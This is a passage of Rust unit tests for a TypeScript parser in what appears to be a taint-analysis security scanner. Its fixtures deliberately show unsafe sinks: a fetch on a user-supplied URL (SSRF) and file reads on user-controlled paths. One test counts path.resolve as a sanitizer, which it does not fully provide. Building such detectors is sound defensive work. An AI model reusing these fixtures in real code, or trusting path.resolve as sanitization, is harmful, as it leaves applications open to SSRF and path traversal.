            .function_defs
            .iter()
            .find(|d| d.name == "readFileContent");
        assert!(exported.is_some());
        assert!(exported.unwrap().is_exported);
        assert_eq!(exported.unwrap().params, vec!["filePath"]);

        let internal = parsed
            .function_defs
            .iter()
            .find(|d| d.name == "internalHelper");
        assert!(internal.is_some());
        assert!(!internal.unwrap().is_exported);
    }

    #[test]
    fn extracts_call_sites() {
        let code = r#"
async function handler(args: any) {
    const validPath = await validatePath(args.path);
    const content = await readFileContent(validPath);
    return content;
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("index.ts"), code)
            .unwrap();
        assert!(!parsed.call_sites.is_empty());
        let rfc_call = parsed
            .call_sites
            .iter()
            .find(|cs| cs.callee == "readFileContent");
        assert!(rfc_call.is_some(), "Should find readFileContent call site");
    }

    #[test]
    fn detects_sanitizer_assignment() {
        let code = r#"
async function handler(args: any) {
    const validPath = await validatePath(args.path);
    const content = await readFileContent(validPath);
    return content;
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("index.ts"), code)
            .unwrap();
        assert!(parsed.sanitized_vars.contains("validPath"));

        // The call to readFileContent(validPath) should classify validPath as Sanitized
        let rfc_call = parsed
            .call_sites
            .iter()
            .find(|cs| cs.callee == "readFileContent");
        assert!(rfc_call.is_some());
        let rfc = rfc_call.unwrap();
        assert!(!rfc.arguments.is_empty());
        assert!(
            matches!(&rfc.arguments[0], ArgumentSource::Sanitized { .. }),
            "validPath should be classified as Sanitized, got: {:?}",
            rfc.arguments[0]
        );
    }

    #[test]
    fn sanitized_var_from_path_resolve() {
        let code = r#"
function processFile(rawPath: string) {
    const safePath = path.resolve(rawPath);
    fs.readFileSync(safePath, "utf-8");
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();
        assert!(parsed.sanitized_vars.contains("safePath"));
    }

    #[test]
    fn url_parse_assignment_is_not_sanitized_for_ssrf() {
        let code = r#"
async function handler(args: { url: string }) {
    const parsedUrl = URL.parse(args.url);
    return fetch(parsedUrl);
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();

        assert!(!parsed.sanitized_vars.contains("parsedUrl"));
        assert_eq!(parsed.network_operations.len(), 1);
        assert!(
            parsed.network_operations[0].url_arg.is_tainted(),
            "URL.parse output must remain tainted for network sinks"
        );
    }

    #[test]
    fn redaction_assignment_is_not_sanitized_for_file_paths() {
        let code = r#"
function redactSecret(value: string): string {
    return value.replace(/secret/g, "[REDACTED]");
}

function handler(args: { path: string }) {
    const redactedPath = redactSecret(args.path);
    return fs.readFileSync(redactedPath, "utf-8");
}
"#;
        let parsed = TypeScriptParser
            .parse_file(Path::new("test.ts"), code)
            .unwrap();

        assert!(!parsed.sanitized_vars.contains("redactedPath"));
        assert_eq!(parsed.file_operations.len(), 1);
        assert!(
            parsed.file_operations[0].path_arg.is_tainted(),
            "redaction output must remain tainted for file path sinks"
        );
    }
}
